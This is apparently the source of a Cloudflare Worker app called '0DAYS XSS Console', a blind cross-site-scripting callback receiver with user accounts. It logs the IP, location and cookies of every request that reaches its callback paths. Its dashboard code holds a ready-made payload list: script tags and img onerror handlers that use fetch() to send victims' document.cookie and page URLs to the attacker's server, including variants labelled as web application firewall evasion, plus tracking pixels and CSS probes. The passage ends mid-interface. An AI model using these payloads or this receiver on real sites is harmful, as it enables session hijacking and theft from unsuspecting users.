var __defProp = Object.defineProperty;
var __name = (target, value) => __defProp(target, "name", { value, configurable: true });

// src/index.js
var index_default = {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;
    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS, DELETE",
      "Access-Control-Allow-Headers": "Content-Type, X-CSRF-Token"
    };
    if (request.method === "OPTIONS") {
      return new Response(null, { headers: corsHeaders });
    }
    if (path === "/auth/signup" && request.method === "POST") {
      return await handleSignup(request, env);
    }
    if (path === "/auth/login" && request.method === "POST") {
      return await handleLogin(request, env);
    }
    if (path === "/auth/logout") {
      return await handleLogout();
    }
    if (path.startsWith("/x/") || path.startsWith("/i/") || path.startsWith("/f/") || path.startsWith("/s/") || path.startsWith("/w/") || path.startsWith("/d/") || path.startsWith("/css/") || path.startsWith("/sw/") || path.startsWith("/reg/")) {
      return await handleCallbackIngest(request, env, url, corsHeaders);
    }
    const user = await getUserFromSession(request, env);
    const userId = user?.userId || null;
    const username = user?.username || null;
    if (!userId) {
      if (path.startsWith("/api/")) {
        return new Response(JSON.stringify({ error: "Unauthorized" }), {
          status: 401,
          headers: {
            ...corsHeaders,
            "Content-Type": "application/json"
          }
        });
      }
      const csrfToken2 = await randomId(16);
      const headers2 = new Headers({
        "Content-Type": "text/html; charset=utf-8"
      });
      headers2.set(
        "Set-Cookie",
        `csrf=${csrfToken2}; Path=/; Secure; SameSite=Strict; Max-Age=3600`
      );
      return new Response(renderLoginSignupHtml(csrfToken2), { headers: headers2 });
    }
    if (path === "/api/callbacks" && request.method === "GET") {
      return await handleListCallbacks(env, userId, corsHeaders);
    }
    if (path.startsWith("/api/delete/") && request.method === "POST") {
      const key = path.replace("/api/delete/", "");
      return await handleDeleteCallback(request, env, userId, key, corsHeaders);
    }
    if (path === "/api/clear" && request.method === "POST") {
      return await handleClearCallbacks(request, env, userId, corsHeaders);
    }
    const csrfToken = await randomId(16);
    const headers = new Headers({
      "Content-Type": "text/html; charset=utf-8",
      "Cache-Control": "no-cache"
    });
    headers.set(
      "Set-Cookie",
      `csrf=${csrfToken}; Path=/; Secure; SameSite=Strict; Max-Age=3600`
    );
    return new Response(renderAppHtml(userId, username, csrfToken), {
      headers
    });
  }
};
async function handleSignup(request, env) {
  const contentType = request.headers.get("Content-Type") || "";
  let username = "";
  let password = "";
  let confirm = "";
  let body = null;
  let form = null;
  if (contentType.includes("application/json")) {
    body = await request.json().catch(() => ({}));
    username = (body.username || "").toString().trim();
    password = (body.password || "").toString();
    confirm = (body.confirm || "").toString();
  } else {
    form = await request.formData();
    username = (form.get("username") || "").toString().trim();
    password = (form.get("password") || "").toString();
    confirm = (form.get("confirm") || "").toString();
  }
  if (!username || !password || !confirm) return errorPage("Invalid credentials.");
  if (password !== confirm) return errorPage("Invalid credentials.");
  if (!isStrongPassword(password)) return errorPage("Invalid credentials.");
  const normUsername = username.toLowerCase();
  if (!/^[a-z0-9_\-\.]{3,32}$/.test(normUsername)) return errorPage("Invalid credentials.");
  const userKey = "user:" + normUsername;
  const existing = await env.XSS_CALLBACKS.get(userKey);
  if (existing) return errorPage("Invalid credentials.");
  const userId = await deriveUserId(normUsername);
  const saltBytes = new Uint8Array(16);
  crypto.getRandomValues(saltBytes);
  const salt = toBase64Url(saltBytes.buffer);
  const hash = await hashPassword(password, saltBytes);
  await env.XSS_CALLBACKS.put(userKey, JSON.stringify({ username: normUsername, userId, salt, hash, createdAt: Date.now(), lastLogin: Date.now() }));
  // Persist username→userId reverse mapping for persistent URL routing
  await env.XSS_CALLBACKS.put("useridmap:" + userId, normUsername);
  const sessionValue = await createSessionCookieValue(userId, env.SESSION_SECRET);
  return new Response(null, { status: 302, headers: { "Set-Cookie": `session=${sessionValue}; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000`, "Location": "/" } });
}
__name(handleSignup, "handleSignup");
async function handleLogin(request, env) {
  const contentType = request.headers.get("Content-Type") || "";
  let username = "";
  let password = "";
  let body = null;
  let form = null;
  if (contentType.includes("application/json")) {
    body = await request.json().catch(() => ({}));
    username = (body.username || "").toString().trim();
    password = (body.password || "").toString();
  } else {
    form = await request.formData();
    username = (form.get("username") || "").toString().trim();
    password = (form.get("password") || "").toString();
  }
  if (!username || !password) return errorPage("Invalid credentials.");
  const normUsername = username.toLowerCase();
  const userKey = "user:" + normUsername;
  const record = await env.XSS_CALLBACKS.get(userKey, "json");
  if (!record || !record.salt || !record.hash || !record.userId) return errorPage("Invalid credentials.");
  const saltBytes = fromBase64Url(record.salt);
  const computedHash = await hashPassword(password, new Uint8Array(saltBytes));
  if (!timingSafeEqual(record.hash, computedHash)) return errorPage("Invalid credentials.");
  record.lastLogin = Date.now();
  await env.XSS_CALLBACKS.put(userKey, JSON.stringify(record));
  // Ensure username→userId reverse mapping exists (idempotent)
  await env.XSS_CALLBACKS.put("useridmap:" + record.userId, normUsername);
  const sessionValue = await createSessionCookieValue(record.userId, env.SESSION_SECRET);
  return new Response(null, { status: 302, headers: { "Set-Cookie": `session=${sessionValue}; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000`, "Location": "/" } });
}
__name(handleLogin, "handleLogin");
async function handleLogout() {
  return new Response(null, { status: 302, headers: { "Set-Cookie": "session=; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=0", "Location": "/" } });
}
__name(handleLogout, "handleLogout");
async function getUserFromSession(request, env) {
  const cookieHeader = request.headers.get("Cookie") || "";
  const cookies = parseCookies(cookieHeader);
  const session = cookies.session;
  if (!session) return null;
  try {
    const [userId, expStr, sig] = session.split(".");
    if (!userId || !expStr || !sig) return null;
    const exp = parseInt(expStr, 10);
    if (!Number.isFinite(exp) || exp * 1e3 < Date.now()) {
      return null;
    }
    const message = `${userId}:${exp}`;
    const ok = await hmacVerify(env.SESSION_SECRET, message, sig);
    if (!ok) return null;
    // Look up the username for persistent URL display
    const username = await env.XSS_CALLBACKS.get("useridmap:" + userId) || null;
    return { userId, username };
  } catch {
    return null;
  }
}
__name(getUserFromSession, "getUserFromSession");
async function handleCallbackIngest(request, env, url, corsHeaders) {
  const path = url.pathname;
  const callbackId = path.split("/")[2] || "unknown";
  const firstSegment = (callbackId.split("-")[0] || "unknown").trim();

  // Resolve the owning userId:
  // 1. Try exact username match (new persistent approach)
  // 2. Try first-segment username match (e.g. "username-tag")
  // 3. Fall back to treating first segment as direct userId (legacy)
  let userKey = null;

  const exactRecord = await env.XSS_CALLBACKS.get("user:" + callbackId, "json");
  if (exactRecord && exactRecord.userId) {
    userKey = exactRecord.userId;
  } else if (firstSegment !== callbackId) {
    const prefixRecord = await env.XSS_CALLBACKS.get("user:" + firstSegment, "json");
    if (prefixRecord && prefixRecord.userId) {
      userKey = prefixRecord.userId;
    }
  }
  if (!userKey) {
    userKey = firstSegment;
  }

  const timestamp = Date.now();
  const key = `callback:${userKey}:${callbackId}:${timestamp}`;
  const data = {
    id: key,
    userId: userKey,
    callbackId,
    timestamp,
    type: path.split("/")[1],
    ip: request.headers.get("CF-Connecting-IP"),
    country: request.cf?.country || "Unknown",
    city: request.cf?.city || "Unknown",
    region: request.cf?.region || "Unknown",
    timezone: request.cf?.timezone || "Unknown",
    userAgent: request.headers.get("User-Agent"),
    referer: request.headers.get("Referer"),
    cookie: request.headers.get("Cookie"),
    origin: request.headers.get("Origin"),
    path,
    method: request.method,
    query: Object.fromEntries(url.searchParams),
    body: null
  };
  if (request.method === "POST") {
    try {
      const contentType = request.headers.get("Content-Type") || "";
      if (contentType.includes("application/json")) {
        data.body = await request.json();
      } else {
        data.body = await request.text();
      }
    } catch (e) {
      data.body = "Error reading body";
    }
  }
  await env.XSS_CALLBACKS.put(key, JSON.stringify(data), {
    expirationTtl: 86400
  });
  return new Response("OK", {
    status: 200,
    headers: corsHeaders
  });
}
__name(handleCallbackIngest, "handleCallbackIngest");
async function handleListCallbacks(env, userId, corsHeaders) {
  const prefix = `callback:${userId}:`;
  const list = await env.XSS_CALLBACKS.list({ prefix });
  const callbacks = [];
  for (const key of list.keys) {
    const value = await env.XSS_CALLBACKS.get(key.name);
    if (!value) continue;
    try {
      callbacks.push(JSON.parse(value));
    } catch {
    }
  }
  callbacks.sort((a, b) => b.timestamp - a.timestamp);
  return new Response(JSON.stringify(callbacks), {
    headers: {
      ...corsHeaders,
      "Content-Type": "application/json"
    }
  });
}
__name(handleListCallbacks, "handleListCallbacks");
async function handleDeleteCallback(request, env, userId, key, corsHeaders) {
  if (!csrfHeaderValid(request)) {
    return new Response(JSON.stringify({ error: "Invalid CSRF token." }), {
      status: 403,
      headers: {
        ...corsHeaders,
        "Content-Type": "application/json"
      }
    });
  }
  const expectedPrefix = `callback:${userId}:`;
  if (!key.startsWith(expectedPrefix)) {
    return new Response(JSON.stringify({ error: "Forbidden" }), {
      status: 403,
      headers: {
        ...corsHeaders,
        "Content-Type": "application/json"
      }
    });
  }
  await env.XSS_CALLBACKS.delete(key);
  return new Response(JSON.stringify({ success: true }), {
    headers: {
      ...corsHeaders,
      "Content-Type": "application/json"
    }
  });
}
__name(handleDeleteCallback, "handleDeleteCallback");
async function handleClearCallbacks(request, env, userId, corsHeaders) {
  if (!csrfHeaderValid(request)) {
    return new Response(JSON.stringify({ error: "Invalid CSRF token." }), {
      status: 403,
      headers: {
        ...corsHeaders,
        "Content-Type": "application/json"
      }
    });
  }
  const prefix = `callback:${userId}:`;
  let cursor = void 0;
  do {
    const list = await env.XSS_CALLBACKS.list({ prefix, cursor });
    cursor = list.cursor;
    for (const key of list.keys) {
      await env.XSS_CALLBACKS.delete(key.name);
    }
  } while (cursor);
  await new Promise((r) => setTimeout(r, 200));
  const verify = await env.XSS_CALLBACKS.list({ prefix });
  if (verify.keys.length > 0) {
    for (const key of verify.keys) {
      await env.XSS_CALLBACKS.delete(key.name);
    }
  }
  return new Response(JSON.stringify({ success: true }), {
    headers: {
      ...corsHeaders,
      "Content-Type": "application/json"
    }
  });
}
__name(handleClearCallbacks, "handleClearCallbacks");
function csrfHeaderValid(request) {
  const cookies = parseCookies(request.headers.get("Cookie") || "");
  const cookieToken = cookies.csrf || "";
  const headerToken = request.headers.get("X-CSRF-Token") || "";
  return !!cookieToken && !!headerToken && cookieToken === headerToken;
}
__name(csrfHeaderValid, "csrfHeaderValid");
function parseCookies(header) {
  const cookies = {};
  if (!header) return cookies;
  const parts = header.split(";");
  for (const part of parts) {
    const [name, ...rest] = part.trim().split("=");
    if (!name) continue;
    cookies[name] = decodeURIComponent(rest.join("=") || "");
  }
  return cookies;
}
__name(parseCookies, "parseCookies");
function errorPage(_message) {
  const displayed = "Invalid credentials.";
  const html = `<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>0DAYS XSS — Error</title>
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <script src="https://cdn.tailwindcss.com"><\/script>
  </head>
  <body class="min-h-screen bg-zinc-950 text-zinc-100 flex items-center justify-center font-mono">
    <div class="max-w-sm w-full mx-4 bg-zinc-900 border border-zinc-800 p-6">
      <div class="text-xs text-zinc-500 uppercase tracking-widest mb-3">Error</div>
      <p class="text-sm text-zinc-300 mb-5">${escapeHtml(displayed)}</p>
      <a href="/" class="inline-block px-4 py-2 bg-zinc-800 hover:bg-zinc-700 border border-zinc-700 text-xs text-zinc-300 rounded-sm">
        &larr; Back to login
      </a>
    </div>
  </body>
</html>`;
  return new Response(html, {
    status: 400,
    headers: { "Content-Type": "text/html; charset=utf-8" }
  });
}
__name(errorPage, "errorPage");
function isStrongPassword(pw) {
  if (pw.length < 8) return false;
  if (!/[a-z]/.test(pw)) return false;
  if (!/[A-Z]/.test(pw)) return false;
  if (!/[0-9]/.test(pw)) return false;
  return true;
}
__name(isStrongPassword, "isStrongPassword");
async function randomId(length) {
  const bytes = new Uint8Array(length);
  crypto.getRandomValues(bytes);
  return Array.from(bytes).map((b) => b.toString(16).padStart(2, "0")).join("");
}
__name(randomId, "randomId");
async function deriveUserId(username) {
  const data = new TextEncoder().encode(username);
  const hash = await crypto.subtle.digest("SHA-256", data);
  const bytes = new Uint8Array(hash);
  return Array.from(bytes).map((b) => b.toString(16).padStart(2, "0")).join("").slice(0, 16);
}
__name(deriveUserId, "deriveUserId");
function toBase64Url(buffer) {
  let binary = "";
  const bytes = new Uint8Array(buffer);
  for (let i = 0; i < bytes.length; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}
__name(toBase64Url, "toBase64Url");
function fromBase64Url(str) {
  const b64 = str.replace(/-/g, "+").replace(/_/g, "/") + "===".slice((str.length + 3) % 4);
  const binary = atob(b64);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes.buffer;
}
__name(fromBase64Url, "fromBase64Url");
async function hashPassword(password, saltBytes) {
  const encoder = new TextEncoder();
  const keyMaterial = await crypto.subtle.importKey(
    "raw",
    encoder.encode(password),
    { name: "PBKDF2" },
    false,
    ["deriveBits"]
  );
  const bits = await crypto.subtle.deriveBits(
    {
      name: "PBKDF2",
      salt: saltBytes,
      iterations: 1e5,
      hash: "SHA-256"
    },
    keyMaterial,
    256
  );
  return toBase64Url(bits);
}
__name(hashPassword, "hashPassword");
function timingSafeEqual(a, b) {
  if (typeof a !== "string" || typeof b !== "string") return false;
  if (a.length !== b.length) return false;
  let out = 0;
  for (let i = 0; i < a.length; i++) {
    out |= a.charCodeAt(i) ^ b.charCodeAt(i);
  }
  return out === 0;
}
__name(timingSafeEqual, "timingSafeEqual");
async function hmacSign(secret, message) {
  const key = await crypto.subtle.importKey(
    "raw",
    new TextEncoder().encode(secret),
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"]
  );
  const sig = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(message));
  return toBase64Url(sig);
}
__name(hmacSign, "hmacSign");
async function hmacVerify(secret, message, signature) {
  try {
    const key = await crypto.subtle.importKey(
      "raw",
      new TextEncoder().encode(secret),
      { name: "HMAC", hash: "SHA-256" },
      false,
      ["verify"]
    );
    const sigBuf = fromBase64Url(signature);
    return await crypto.subtle.verify(
      "HMAC",
      key,
      sigBuf,
      new TextEncoder().encode(message)
    );
  } catch {
    return false;
  }
}
__name(hmacVerify, "hmacVerify");
async function createSessionCookieValue(userId, secret) {
  const now = Math.floor(Date.now() / 1e3);
  const exp = now + 60 * 60 * 24 * 30;
  const message = `${userId}:${exp}`;
  const sig = await hmacSign(secret, message);
  return `${userId}.${exp}.${sig}`;
}
__name(createSessionCookieValue, "createSessionCookieValue");
function escapeHtml(str) {
  return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}
__name(escapeHtml, "escapeHtml");
function renderLoginSignupHtml(csrfToken) {
  return `<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>0DAYS — XSS Console</title>
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <script src="https://cdn.tailwindcss.com"><\/script>
    <style>
      body { font-family: 'Courier New', Courier, monospace; }
      input:-webkit-autofill { -webkit-box-shadow: 0 0 0 100px #09090b inset; -webkit-text-fill-color: #e4e4e7; }
    </style>
  </head>
  <body class="min-h-screen bg-zinc-950 text-zinc-100 flex items-center justify-center px-4">
    <div class="w-full max-w-2xl">

      <!-- Header -->
      <div class="mb-6 pb-4 border-b border-zinc-800">
        <div class="flex items-baseline gap-3">
          <span class="text-2xl font-bold tracking-tight">
            <span class="text-violet-400">0</span>DAYS
          </span>
          <span class="text-[10px] text-zinc-500 border border-zinc-700 px-2 py-0.5 rounded-sm">
            XSS Console
          </span>
        </div>
        <p class="text-xs text-zinc-600 mt-2">
          Blind XSS callback receiver &mdash; username-persistent payload URLs &mdash; no email required
        </p>
      </div>

      <!-- Forms -->
      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">

        <!-- Sign Up -->
        <div class="bg-zinc-900 border border-zinc-800 p-5">
          <h2 class="text-[10px] font-bold text-zinc-500 uppercase tracking-widest mb-4">Create Account</h2>
          <form method="POST" action="/auth/signup" class="space-y-3">
            <input type="hidden" name="csrf" value="${csrfToken}">
            <div>
              <label class="block text-xs text-zinc-500 mb-1">Username</label>
              <input type="text" name="username" required autocomplete="off"
                class="w-full px-3 py-2 bg-zinc-950 border border-zinc-700 text-zinc-100 text-sm outline-none focus:border-violet-500 rounded-sm font-mono"
                placeholder="your_handle" />
              <p class="text-[10px] text-zinc-700 mt-1">3&ndash;32 chars &middot; a-z 0-9 _ - .</p>
            </div>
            <div>
              <label class="block text-xs text-zinc-500 mb-1">Password</label>
              <input type="password" name="password" required minlength="8"
                class="w-full px-3 py-2 bg-zinc-950 border border-zinc-700 text-zinc-100 text-sm outline-none focus:border-violet-500 rounded-sm"
                placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" />
            </div>
            <div>
              <label class="block text-xs text-zinc-500 mb-1">Confirm Password</label>
              <input type="password" name="confirm" required minlength="8"
                class="w-full px-3 py-2 bg-zinc-950 border border-zinc-700 text-zinc-100 text-sm outline-none focus:border-violet-500 rounded-sm"
                placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" />
            </div>
            <button type="submit"
              class="w-full py-2 bg-violet-700 hover:bg-violet-600 text-white text-sm font-semibold rounded-sm transition-colors mt-1">
              Register
            </button>
          </form>
        </div>

        <!-- Log In -->
        <div class="bg-zinc-900 border border-zinc-800 p-5">
          <h2 class="text-[10px] font-bold text-zinc-500 uppercase tracking-widest mb-4">Log In</h2>
          <form method="POST" action="/auth/login" class="space-y-3">
            <input type="hidden" name="csrf" value="${csrfToken}">
            <div>
              <label class="block text-xs text-zinc-500 mb-1">Username</label>
              <input type="text" name="username" required autocomplete="username"
                class="w-full px-3 py-2 bg-zinc-950 border border-zinc-700 text-zinc-100 text-sm outline-none focus:border-violet-500 rounded-sm font-mono"
                placeholder="your_handle" />
            </div>
            <div>
              <label class="block text-xs text-zinc-500 mb-1">Password</label>
              <input type="password" name="password" required
                class="w-full px-3 py-2 bg-zinc-950 border border-zinc-700 text-zinc-100 text-sm outline-none focus:border-violet-500 rounded-sm"
                placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" />
            </div>
            <button type="submit"
              class="w-full py-2 bg-zinc-700 hover:bg-zinc-600 text-white text-sm font-semibold rounded-sm transition-colors mt-6">
              Sign In
            </button>
          </form>
          <p class="mt-4 text-[10px] text-zinc-700 leading-relaxed">
            Payload URLs are tied permanently to your username. Callbacks arrive even months later with no re-configuration needed.
          </p>
        </div>
      </div>

      <!-- Footer -->
      <div class="mt-4 flex justify-end gap-4 text-[10px] text-zinc-700">
        <a href="https://youtube.com/@0dayscyber" target="_blank" class="hover:text-zinc-500">YouTube</a>
        <a href="https://github.com/TheEmperorsPath" target="_blank" class="hover:text-zinc-500">GitHub</a>
      </div>
    </div>
  </body>
</html>`;
}
__name(renderLoginSignupHtml, "renderLoginSignupHtml");
function renderAppHtml(userId, username, csrfToken) {
  const displayName = escapeHtml(username || userId);
  return String.raw`<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>0DAYS - XSS Console</title>
    <script src="https://cdn.tailwindcss.com"></scri` + `pt>
    <style>
      body { font-family: 'Courier New', Courier, monospace; }
      ::-webkit-scrollbar { width: 4px; height: 4px; }
      ::-webkit-scrollbar-track { background: #09090b; }
      ::-webkit-scrollbar-thumb { background: #3f3f46; }
      .animate-pulse { animation: pulse 2s cubic-bezier(0.4,0,0.6,1) infinite; }
      @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
    </style>
  </head>
  <body class="bg-zinc-950 text-zinc-100">
    <div id="root"></div>
    <script>
      window.__USER_ID__ = "${userId}";
      window.__USERNAME__ = "${displayName}";
      window.__CSRF__ = "${csrfToken}";
    <\/script>
    <script src="https://unpkg.com/react@18/umd/react.production.min.js"><\/script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"><\/script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"><\/script>
    <script type="text/babel">
      const { useState, useEffect, useCallback } = React;

      function App() {
        const [callbacks, setCallbacks] = useState([]);
        const [selectedId, setSelectedId] = useState(null);
        const [urlEncode, setUrlEncode] = useState(false);
        const [activeCategory, setActiveCategory] = useState('standard');
        const [copyNote, setCopyNote] = useState('');

        const baseUrl = window.location.origin;
        const USERNAME = window.__USERNAME__ || 'anon';
        const CSRF = window.__CSRF__ || '';

        // Persistent, username-based callback ID — never changes between sessions
        const callbackId = USERNAME;

        /* START_PAYLOAD_BLOCK */
const payloadCategories = [
  {
    id: "standard",
    name: "Standard Payloads",
    description: "General XSS callback payloads with full exfil.",
    payloads: [
      {
        name: "Full Exfil Script",
        severity: "critical",
        code:
          '<scri' +
          'pt>' +
          'fetch("' +
          baseUrl + '/x/' + callbackId +
          '",{' +
          'method:"POST",' +
          'headers:{"Content-Type":"application/json"},' +
          'body:JSON.stringify({' +
          'cookie:document.cookie,' +
          'domain:location.hostname,' +
          'url:location.href,' +
          'ref:document.referrer,' +
          'ua:navigator.userAgent' +
          '})' +
          '})' +
          '</scri' +
          'pt>'
      },
      {
        name: "Image Beacon",
        severity: "high",
        code:
          '<img src="' +
          baseUrl + '/i/' + callbackId +
          '?cookie=' + encodeURIComponent(document.cookie) +
          '&domain=' + encodeURIComponent(location.hostname) +
          '&url=' + encodeURIComponent(location.href) +
          '&ua=' + encodeURIComponent(navigator.userAgent) +
          '" style="display:none;width:1px;height:1px;">'
      },
      {
        name: "Fetch API (JSON)",
        severity: "critical",
        code:
          '<scri' +
          'pt>' +
          'fetch("' +
          baseUrl + '/f/' + callbackId +
          '",{' +
          'method:"POST",' +
          'headers:{"Content-Type":"application/json"},' +
          'body:JSON.stringify({' +
          'cookie:document.cookie,' +
          'domain:location.hostname,' +
          'url:location.href,' +
          'ref:document.referrer,' +
          'ua:navigator.userAgent' +
          '})' +
          '})' +
          '</scri' +
          'pt>'
      }
    ]
  },
  {
    id: "cloudflare",
    name: "Cloudflare WAF Evasion",
    description: "Obfuscated payloads tuned for CF filtering.",
    payloads: [
      {
        name: "Img onerror \u2192 fetch()",
        severity: "high",
        code:
          '<img src=x onerror="this.remove();fetch(\\'' +
          baseUrl + '/x/' + callbackId +
          '\\',{method:\\'POST\\',headers:{\\'Content-Type\\':\\'application/json\\'},' +
          'body:JSON.stringify({cookie:document.cookie,domain:location.hostname,url:location.href,ua:navigator.userAgent})' +
          '});">'
      }
    ]
  },
  {
    id: "modsecurity",
    name: "ModSecurity WAF Evasion",
    description: "Stealthy SVG payload tuned for CRS.",
    payloads: [
      {
        name: "SVG confirm popup (no callback)",
        severity: "medium",
        code: '<svg onload=confirm("xss")>'
      }
    ]
  },
  {
    id: "stealth",
    name: "Stealth Beacons",
    description: "Low-noise callbacks with basic exfil.",
    payloads: [
      {
        name: "CSS Probe",
        severity: "medium",
        code:
          '<link rel="stylesheet" href="' +
          baseUrl + '/css/' + callbackId +
          '?domain=' + encodeURIComponent(location.hostname) +
          '&url=' + encodeURIComponent(location.href) +
          '&ref=' + encodeURIComponent(document.referrer) +
          '">'
      },
      {
        name: "Pixel Probe",
        severity: "medium",
        code:
          '<img src="' +
          baseUrl + '/i/' + callbackId +
          '?domain=' + encodeURIComponent(location.hostname) +
          '&url=' + encodeURIComponent(location.href) +
          '&ua=' + encodeURIComponent(navigator.userAgent) +
          '" width="1" height="1" style="opacity:0;">'
      },
      {
        name: "Navigator Fingerprint (JSON)",
        severity: "high",
        code:
          '<scri' +
          'pt>' +
          'fetch("' +
          baseUrl + '/w/' + callbackId +
          '",{' +
          'method:"POST",' +
          'headers:{"Content-Type":"application/json"},' +
          'body:JSON.stringify({' +
          'domain:location.hostname,' +
          'url:location.href,' +
          'ref:document.referrer,' +
          'ua:navigator.userAgent,' +
          'cookie:document.cookie' +
          '})' +
          '})' +
          '</scri' +
          'pt>'
      }
    ]
  }
];
/* END_PAYLOAD_BLOCK */

        const totalPayloads = payloadCategories.reduce((sum, cat) => sum + cat.payloads.length, 0);

        useEffect(() => {
          loadCallbacks();
          const interval = setInterval(loadCallbacks, 120000);
          return () => clearInterval(interval);
        }, []);

        async function loadCallbacks() {
          try {
            const res = await fetch('/api/callbacks');
            const data = await res.json();
            setCallbacks(data);
          } catch (e) {
            console.error('Failed to load:', e);
          }
        }

        async function sendTest(type) {
          await fetch('/x/' + callbackId, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ test: true, type: type, cookie: 'session_id=abc123', timestamp: Date.now() })
          });
          setTimeout(loadCallbacks, 500);
        }

        async function clearAll() {
          if (confirm('Clear all callbacks?')) {
            await fetch('/api/clear', {
              method: 'POST',
              headers: { 'X-CSRF-Token': CSRF }
            });
            setCallbacks([]);
            setSelectedId(null);
          }
        }

        async function deleteCallback(id) {
          await fetch('/api/delete/' + encodeURIComponent(id), {
            method: 'POST',
            headers: { 'X-CSRF-Token': CSRF }
          });
          loadCallbacks();
        }

        function logout() {
          window.location.href = '/auth/logout';
        }

        function copy(text) {
          navigator.clipboard.writeText(text).then(() => {
            setCopyNote('Copied');
            setTimeout(() => setCopyNote(''), 1200);
          });
        }

        function exportData() {
          const blob = new Blob([JSON.stringify(callbacks, null, 2)], { type: 'application/json' });
          const url = URL.createObjectURL(blob);
          const a = document.createElement('a');
          a.href = url;
          a.download = '0days-' + Date.now() + '.json';
          a.click();
        }

        const encode = (txt) => urlEncode ? encodeURIComponent(txt) : txt;
        const severityClass = (s) =>
          s === 'critical' ? 'border-red-800 text-red-400' :
          s === 'high'     ? 'border-amber-800 text-amber-400' :
                             'border-sky-900 text-sky-400';

        return (
          <div className="min-h-screen bg-zinc-950 text-zinc-100 text-sm">

            {/* ── Header ── */}
            <header className="border-b border-zinc-800 bg-zinc-950">
              <div className="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between gap-4 flex-wrap">
                <div className="flex items-center gap-3">
                  <span className="text-lg font-bold tracking-tight">
                    <span className="text-violet-400">0</span>DAYS
                  </span>
                  <span className="text-[10px] border border-zinc-700 px-2 py-0.5 text-zinc-500 rounded-sm">
                    XSS Console
                  </span>
                  <span className="text-[10px] text-zinc-600 hidden sm:inline">
                    {USERNAME}
                  </span>
                </div>
                <div className="flex items-center gap-2">
                  <a href="https://youtube.com/@0dayscyber" target="_blank" className="text-[10px] text-zinc-600 hover:text-zinc-400 hidden sm:inline">YT</a>
                  <a href="https://github.com/TheEmperorsPath" target="_blank" className="text-[10px] text-zinc-600 hover:text-zinc-400 hidden sm:inline">GH</a>
                  {copyNote && (
                    <span className="text-[10px] text-violet-400 px-2">{copyNote}</span>
                  )}
                  <button onClick={exportData} disabled={callbacks.length === 0}
                    className="px-3 py-1.5 bg-zinc-800 hover:bg-zinc-700 border border-zinc-700 text-zinc-300 text-xs rounded-sm disabled:opacity-40 transition-colors">
                    Export
                  </button>
                  <button onClick={clearAll}
                    className="px-3 py-1.5 bg-zinc-800 hover:bg-zinc-700 border border-zinc-700 text-red-400 text-xs rounded-sm transition-colors">
                    Clear
                  </button>
                  <button onClick={logout}
                    className="px-3 py-1.5 bg-zinc-800 hover:bg-zinc-700 border border-zinc-700 text-zinc-300 text-xs rounded-sm transition-colors">
                    Logout
                  </button>
                </div>
              </div>
            </header>

            <main className="max-w-7xl mx-auto px-4 py-5">

              {/* ── Stats Bar ── */}
              <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 mb-5">
                <div className="bg-zinc-900 border border-zinc-800 p-3 rounded-sm">
                  <div className="text-[10px] text-zinc-500 uppercase tracking-wider">Callbacks</div>
                  <div className="text-2xl font-bold mt-1">{callbacks.length}</div>
                </div>
                <div className="bg-zinc-900 border border-zinc-800 p-3 rounded-sm">
                  <div className="text-[10px] text-zinc-500 uppercase tracking-wider">Payloads</div>
                  <div className="text-2xl font-bold mt-1">{totalPayloads}</div>
                </div>
                <div className="bg-zinc-900 border border-zinc-800 p-3 rounded-sm col-span-2 lg:col-span-1">
                  <div className="text-[10px] text-zinc-500 uppercase tracking-wider mb-1">Persistent URL</div>
                  <div className="flex items-center gap-2">
                    <span className="text-[10px] text-violet-300 break-all font-mono">{baseUrl}/x/{callbackId}</span>
                    <button onClick={() => copy(baseUrl + '/x/' + callbackId)}
                      className="shrink-0 text-[9px] px-1.5 py-0.5 border border-zinc-700 hover:border-violet-600 text-zinc-500 hover:text-violet-300 rounded-sm transition-colors">
                      copy
                    </button>
                  </div>
                </div>
                <div className="bg-zinc-900 border border-zinc-800 p-3 rounded-sm">
                  <div className="text-[10px] text-zinc-500 uppercase tracking-wider">Status</div>
                  <div className="text-xs font-bold text-emerald-400 mt-1 flex items-center gap-1.5">
                    <span className="inline-block h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
                    LIVE
                  </div>
                </div>
              </div>

              {/* ── Main Grid ── */}
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">

                {/* ── Payloads Panel ── */}
                <div className="bg-zinc-900 border border-zinc-800 rounded-sm flex flex-col">
                  <div className="flex items-center justify-between px-4 py-3 border-b border-zinc-800">
                    <span className="text-[10px] font-bold text-zinc-400 uppercase tracking-widest">Payloads</span>
                    <div className="flex gap-1">
                      <button onClick={() => setUrlEncode(false)}
                        className={'px-2.5 py-1 text-[10px] border rounded-sm transition-colors ' +
                          (!urlEncode ? 'bg-zinc-700 border-zinc-600 text-zinc-100' : 'bg-zinc-900 border-zinc-700 text-zinc-500')}>
